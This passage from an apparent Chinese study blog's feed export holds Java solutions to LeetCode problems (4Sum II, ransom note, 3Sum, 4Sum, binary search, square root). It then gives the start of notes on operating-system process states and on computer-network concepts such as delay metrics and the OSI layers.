class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs Java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">fourSumCount</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums1, <span class="hljs-keyword">int</span>[] nums2, <span class="hljs-keyword">int</span>[] nums3, <span class="hljs-keyword">int</span>[] nums4)</span> </span>&#123;<br>        Map&lt;Integer, Integer&gt; map = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>        <span class="hljs-keyword">int</span> count = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> a : nums1)&#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> b : nums2)&#123;<br>                <span class="hljs-keyword">int</span> tmp = a + b;<br>                <span class="hljs-keyword">if</span>(map.containsKey(tmp) )&#123;<br>                    map.put(tmp, map.get(tmp) + <span class="hljs-number">1</span>);<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    map.put(tmp, <span class="hljs-number">1</span>);<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> c : nums3)&#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> d : nums4)&#123;<br>                <span class="hljs-keyword">int</span> tmp = -(c + d);<br>                <span class="hljs-keyword">if</span>(map.containsKey(tmp))&#123;<br>                    count += map.get(tmp);<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> count;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="赎金信"><a href="#赎金信" class="headerlink" title="赎金信"></a>赎金信</h2><p><a href="https://leetcode-cn.com/problems/ransom-note/">题目链接</a></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs Java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">canConstruct</span><span class="hljs-params">(String ransomNote, String magazine)</span> </span>&#123;<br>        <span class="hljs-comment">// if(ransomNote.length() &gt; magazine.length()) return false;</span><br><br>        <span class="hljs-keyword">int</span> arr[] = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">26</span>];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">char</span> c : magazine.toCharArray())&#123; <span class="hljs-comment">// 材料</span><br>            arr[c - <span class="hljs-string">&#x27;a&#x27;</span>] += <span class="hljs-number">1</span>;<br>        &#125; <br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">char</span> c : ransomNote.toCharArray())&#123; <span class="hljs-comment">// 消耗</span><br>            arr[c - <span class="hljs-string">&#x27;a&#x27;</span>] -= <span class="hljs-number">1</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> a : arr)&#123;<br>            <span class="hljs-keyword">if</span>(a &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="三数之和"><a href="#三数之和" class="headerlink" title="三数之和"></a>三数之和</h2><p><a href="https://leetcode-cn.com/problems/3sum/">题目链接</a></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs Java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> List&lt;List&lt;Integer&gt;&gt; threeSum(<span class="hljs-keyword">int</span>[] nums) &#123;<br>        List&lt;List&lt;Integer&gt;&gt; res = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br>        Arrays.sort(nums);<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; nums.length; i++)&#123;<br>            <span class="hljs-keyword">if</span>(nums[i] &gt; <span class="hljs-number">0</span>)&#123; <span class="hljs-comment">// 如果是0的话就已经不符合条件了</span><br>                <span class="hljs-keyword">return</span> res;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span>(i &gt; <span class="hljs-number">0</span> &amp;&amp; nums[i] == nums[i - <span class="hljs-number">1</span>])&#123; <span class="hljs-comment">// 去重</span><br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">int</span> left = i + <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">int</span> right = nums.length - <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">while</span>(left &lt; right)&#123;<br>                <span class="hljs-keyword">int</span> sum = nums[i] + nums[left] + nums[right];<br>                <span class="hljs-keyword">if</span>(sum &lt; <span class="hljs-number">0</span>)&#123;<br>                    left++;<br>                &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(sum &gt; <span class="hljs-number">0</span>)&#123;<br>                    right--;<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    res.add(Arrays.asList(nums[i], nums[left], nums[right]));<br>                    <span class="hljs-comment">// 去重</span><br>                    <span class="hljs-keyword">while</span>(left &lt; right &amp;&amp; nums[left] == nums[left + <span class="hljs-number">1</span>]) left++;<br>                    <span class="hljs-keyword">while</span>(left &lt; right &amp;&amp; nums[right] == nums[right - <span class="hljs-number">1</span>]) right--;<br>                    <span class="hljs-comment">// 去重完两边同时向中间靠</span><br>                    left++;<br>                    right--;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="四数之和"><a href="#四数之和" class="headerlink" title="四数之和"></a>四数之和</h2><p><a href="https://leetcode-cn.com/problems/4sum/">题目链接</a></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs Java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> List&lt;List&lt;Integer&gt;&gt; fourSum(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> target) &#123;<br>        List&lt;List&lt;Integer&gt;&gt; res = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br>        Arrays.sort(nums);<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; nums.length; i++)&#123;<br>            <span class="hljs-keyword">if</span>(i &gt; <span class="hljs-number">0</span> &amp;&amp; nums[i] == nums[i - <span class="hljs-number">1</span>])&#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j = i + <span class="hljs-number">1</span>; j &lt; nums.length; j++)&#123;<br>                <span class="hljs-keyword">if</span>(j &gt; i + <span class="hljs-number">1</span> &amp;&amp; nums[j] == nums[j - <span class="hljs-number">1</span>])&#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br><br>                <span class="hljs-keyword">int</span> left = j + <span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">int</span> right = nums.length - <span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">while</span>(left &lt; right)&#123;<br>                    <span class="hljs-keyword">int</span> sum = nums[i] + nums[j] + nums[left] + nums[right];<br>                    <span class="hljs-keyword">if</span>(sum &gt; target)&#123;<br>                        right--;<br>                    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(sum &lt; target)&#123;<br>                        left++;<br>                    &#125;<span class="hljs-keyword">else</span>&#123;<br>                        res.add(Arrays.asList(nums[i], nums[j], nums[left], nums[right]));<br>                        <span class="hljs-keyword">while</span>(left &lt; right &amp;&amp; nums[left] == nums[left + <span class="hljs-number">1</span>]) left++;<br>                        <span class="hljs-keyword">while</span>(left &lt; right &amp;&amp; nums[right] == nums[right - <span class="hljs-number">1</span>]) right--;<br>                        left++;<br>                        right--;<br>                    &#125;<br>                    <br>                &#125;<br>            &#125;<br><br>        &#125;<br><br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><h2 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h2><p><a href="https://leetcode-cn.com/problems/binary-search/">题目链接</a></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs Java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">search</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> target)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> left = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">int</span> right = nums.length - <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span>(left &lt;= right)&#123;<br>            <span class="hljs-comment">// int middle = (left + right) / 2;</span><br>            <span class="hljs-keyword">int</span> middle = left + (right - left) / <span class="hljs-number">2</span>; <span class="hljs-comment">// 防止溢出</span><br>            <span class="hljs-keyword">if</span>(nums[middle] &lt; target)&#123;<br>                left = middle + <span class="hljs-number">1</span>;<br>            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(nums[middle] &gt; target)&#123;<br>                right = middle - <span class="hljs-number">1</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">return</span> middle;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="搜索插入位置"><a href="#搜索插入位置" class="headerlink" title="搜索插入位置"></a>搜索插入位置</h3><p><a href="https://leetcode-cn.com/problems/search-insert-position/">题目链接</a></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs Java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">searchInsert</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> target)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> left = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">int</span> right = nums.length - <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span>(left &lt;= right)&#123;<br>            <span class="hljs-keyword">int</span> mid = left + (right - left) / <span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">if</span>(nums[mid] &lt; target)&#123;<br>                left = mid + <span class="hljs-number">1</span>;<br>            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(nums[mid] &gt; target)&#123;<br>                right = mid - <span class="hljs-number">1</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">return</span> mid;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> right + <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="在排序数组中查找元素的第一个和最后一个位置"><a href="#在排序数组中查找元素的第一个和最后一个位置" class="headerlink" title="在排序数组中查找元素的第一个和最后一个位置"></a>在排序数组中查找元素的第一个和最后一个位置</h3><p><a href="https://leetcode-cn.com/problems/find-first-and-last-position-of-element-in-sorted-array/submissions/">题目链接</a></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs Java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[] searchRange(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> target) &#123;<br>        <span class="hljs-comment">// 第1种情况：元素比数组所有元素都小或大</span><br>        <span class="hljs-comment">// 第2种情况：target在num范围内且是其中元素</span><br>        <span class="hljs-keyword">int</span> leftBorder = binarySearch(nums, target); <span class="hljs-comment">//第一个大于等于target的元素</span><br>        <span class="hljs-keyword">int</span> rightBorder = binarySearch(nums, target + <span class="hljs-number">1</span>); <span class="hljs-comment">// 第1个大于target的元素</span><br>        <span class="hljs-keyword">if</span>(leftBorder == nums.length) <span class="hljs-comment">// 比所有元素大</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[]&#123;-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>&#125;;<br>        <span class="hljs-keyword">if</span>(nums[leftBorder] != target)&#123; <span class="hljs-comment">// 比所有元素小，在范围中但不是其中元素</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[]&#123;-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>&#125;;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[]&#123;leftBorder, rightBorder - <span class="hljs-number">1</span>&#125;;<br>        &#125;<br>        <br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">binarySearch</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> target)</span></span>&#123;<br>        <span class="hljs-keyword">int</span> left = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">int</span> right = nums.length - <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span>(left &lt;= right)&#123;<br>            <span class="hljs-keyword">int</span> mid = left + (right - left) / <span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">if</span>(nums[mid] &gt;= target)&#123;<br>                right = mid - <span class="hljs-number">1</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                left = mid + <span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> left;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="x的平方根"><a href="#x的平方根" class="headerlink" title="x的平方根"></a>x的平方根</h3><p><a href="https://leetcode-cn.com/problems/sqrtx/submissions/">题目链接</a></p><p>对于二分查找，right指针在循环终止后，会指向最后一个&lt;=target的元素（可以通过实验验证，数学证明不会~），依据这个，在求x的平方根时，对所有&lt;= x / 2的数进行二分查找，寻找平方等于target的那个数；若找不到，则返回right指针指向的那个数，它指向的就是根号target的整数部分。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs Java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        System.out.println(mySqrt(<span class="hljs-number">2147395599</span>));<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">mySqrt</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (x == <span class="hljs-number">0</span> || x == <span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">return</span> x;<br><br>        <span class="hljs-keyword">int</span> left = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">int</span> right = x / <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">while</span> (left &lt;= right) &#123;<br>            <span class="hljs-keyword">int</span> mid = left + (right - left) / <span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">long</span> tmp = (<span class="hljs-keyword">long</span>) mid * mid;<br>            <span class="hljs-keyword">if</span> (tmp &lt; x) &#123;<br>                left = mid + <span class="hljs-number">1</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (tmp &gt; x) &#123;<br>                right = mid - <span class="hljs-number">1</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">return</span> mid;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> right;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>LeetCode</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>操作系统总结</title>
    <link href="/2022/03/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    <url>/2022/03/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h1><h2 id="进程与线程"><a href="#进程与线程" class="headerlink" title="进程与线程"></a>进程与线程</h2><h3 id="进程的概念和特征"><a href="#进程的概念和特征" class="headerlink" title="进程的概念和特征"></a>进程的概念和特征</h3><h4 id="进程的概念"><a href="#进程的概念" class="headerlink" title="进程的概念"></a>进程的概念</h4><p>进程是进程实体的运行过程，是系统进行资源分配和调度的一个独立单位</p><p>进程控制块（Process Control Block）描述进程的基本信息和运行状态，所谓的创建进程和撤销进程，都是指对 PCB 的操作。</p><p>进程实体 = 程序段 + 相关数据段 + PCB</p><h3 id="进程的状态与切换"><a href="#进程的状态与切换" class="headerlink" title="进程的状态与切换"></a>进程的状态与切换</h3><ol><li>创建态：进程正在被创建，尚未转到就绪态</li><li>就绪态：进程获得了除处理机外的一切所有资源，一旦得到处理机，便可直接运行。就绪队列</li><li>运行态：进程正在处理其上运行</li><li>阻塞态：进程正在等待某一事件而暂停运行，如等待某资源为可用或等待输入/输出完成，即使处理机空闲，该进程也不能运行</li><li>结束态：进程正从系统消失，可能是进程正常结束或其他原因中断退出运行。</li></ol><p><img src="https://s2.loli.net/2022/03/08/roQUj1Dh7zvC5ET.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/03/08/em1HKahDiExluYG.png" alt="image.png"></p>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络总结</title>
    <link href="/2022/03/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%80%BB%E7%BB%93/"/>
    <url>/2022/03/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="一、计算机网络体系结构"><a href="#一、计算机网络体系结构" class="headerlink" title="一、计算机网络体系结构"></a>一、计算机网络体系结构</h1><h2 id="计算机网络的概念、组成与功能"><a href="#计算机网络的概念、组成与功能" class="headerlink" title="计算机网络的概念、组成与功能"></a>计算机网络的概念、组成与功能</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>计算机网络是一个将分散、具有独立功能的计算机系统，通过通信设备与线路连接起来，由功能完善的软件实现资源共享和信息传递的系统。</p><h3 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h3><ul><li>从组成部分上看： 由硬件、软件、协议组成</li><li>从工作方式：边缘部分（主机）、核心部分（路由器）</li><li>功能组成：通信子网（由各种传输介质、通信设备和相应的网络协议组成，实现数据传输、交换、控制和存储）和资源子网（实现资源共享的设备及其软件的集合）</li></ul><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><ul><li>数据通信</li><li>资源共享</li><li>分布式处理</li><li>提高可靠性</li><li>负载均衡</li></ul><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><ol><li><p>按分布范围分类</p><ul><li>广域网（WAN），连接广域网的各结点交换机的链路一般是高速链路，具有较大的通信容量</li><li>城域网（MAN），大多采用以太网技术</li><li>局域网（LAN），使用广播技术，而广域网使用交换技术</li><li>个人区域网（PAN），无线技术相连</li></ul></li><li><p>按传输技术</p><ul><li>广播式网络</li><li>点对点网络</li></ul></li><li><p>按拓扑结构分类<br><img src="https://s2.loli.net/2022/03/01/W5PwpRVvsMyitLq.png" alt="image.png"></p><ul><li>总线型网络</li><li>星形网络</li><li>环形网络</li><li>网状形<br>总线形和环形网络多用于局域网，网状形网络多用于广域网 </li></ul></li><li><p>按交换技术分类</p><ul><li>电路交换网络：在源结点和目的结点之间建立一条专用的通路用于传送数据，包括建立连接、传输数据和断开连接三个阶段。<strong>优点是数据直接传送、时延小；缺点是线路利用率低，不能充分利用线路容量、不便于进行差错控制</strong></li><li>报文交换网络：用户数据加上源地址、目的地址、校验码等辅助信息、然后封装成报文。每个报文可以单独选择到达目的结点的路径；<strong>优点是可以充分利用线路容量，缺点是增大了资源开销</strong></li><li>分组交换网络：将数据分成较短的固定长度的数据块，在每个数据块中加上目的地址、源地址等辅助信息组成分组（包），以存储-转发方式传输</li></ul></li></ol><h3 id="几个指标"><a href="#几个指标" class="headerlink" title="几个指标"></a>几个指标</h3><ol><li>带宽（Bandwidth）bit/s</li><li>时延（Delay）：<ul><li>发送（传输）时延：发送分组的第一个比特算起，到该分组的最后一个比特发送完毕所需的时间（<strong>发送时延 = 分组长度 / 信道宽度</strong>）</li><li>传播时延：电磁波在信道中传播的时间（<strong>传播时延 = 信道长度 / 电磁波在信道上传播速率</strong>）</li><li>处理时延：一些必要处理所花费的时间</li><li>排队时延：分组在进入路由器后要先在输入队列中排队等待处理。路由器确定转发端口后，还要在输出队列中排队等待转发<br>总时延等于上述四部分之和</li></ul></li><li>时延带宽积：发送端发送的第一个比特即将到达终点时，发送端已经发送了多少比特（<strong>时延带宽积 = 传播时延 * 信道带宽</strong>）：<br><img src="https://s2.loli.net/2022/03/01/Na45fMYnp3HcmP6.png" alt="image.png"></li><li>往返时延（Round-Trip Time, RTT）：发送端发送数据开始，到发送端收到来自接受的确认，总共经历的时延</li></ol><h2 id="计算机网络体系结构及分层模型"><a href="#计算机网络体系结构及分层模型" class="headerlink" title="计算机网络体系结构及分层模型"></a>计算机网络体系结构及分层模型</h2><p>在计算机网络的分层结构中，第n层的活动元素通常称为n层实体。不同机器上的同一层称为对等层；同一层的实体称为对等实体。n层实体实现的服务为n+1层所利用，在这种情况下，n层被称为服务提供者，n+1层则服务于用户</p><h3 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h3><p>为了完成计算机之间有序的信息交换，提出了通信协议的概念，其定义是相互通信的双方（或多方）对如何进行信息交换所必须遵守的一整套规则。<br>协议设计到三个要素，分别为：</p><ul><li>语法：语法是用户数据与控制信息的结构与格式，以及数据出现顺序的意义</li><li>语义：用于解释比特流的每一部分的意义</li><li>时序：事件实现顺序的详细说明</li></ul><h3 id="ISO-OSI参考模型"><a href="#ISO-OSI参考模型" class="headerlink" title="ISO/OSI参考模型"></a>ISO/OSI参考模型</h3><p><img src="https://s2.loli.net/2022/03/01/eXgulw6ZbSPnTfR.png" alt="image.png"><br><img src="https://s2.loli.net/2022/03/03/hfu4L6GmgqXKtys.png" alt="image.png"></p><ul><li><strong>应用层</strong>：最高层，为特定应用提供数据传输服务，例如HTTP、DNS协议。数据单位为<strong>报文</strong>（message）</li><li><strong>传输层</strong>：负责向<strong>两台主机中进程之间的通信</strong>提供<strong>通用的数据传输服务</strong>。由于应用层协议很多，定义通用的传输层协议就可以支持不断增多的应用层协议。<ul><li>运输层包括两种协议：传输控制协议 TCP，提供面向连接、可靠的数据传输服务，数据单位为<strong>报文段</strong>（segment） ；</li><li>用户数据报协议 UDP，提供无连接、尽最大努力的数据传输服务，数据单位为<strong>用户数据报</strong>。TCP 主要提供完整性服务，UDP 